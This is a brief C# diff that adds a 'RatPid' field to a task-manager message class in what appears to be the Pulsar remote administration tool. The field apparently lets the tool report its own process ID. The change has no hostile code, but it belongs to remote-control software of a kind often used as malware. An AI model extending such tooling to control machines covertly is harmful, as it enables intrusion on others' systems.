@@ -9,5 +9,8 @@ namespace Pulsar.Common.Messages.Administration.TaskManager
     {
         [ProtoMember(1)]
         public Process[] Processes { get; set; }
+
+        [ProtoMember(2)]
+        public int? RatPid { get; set; }
     }
 }
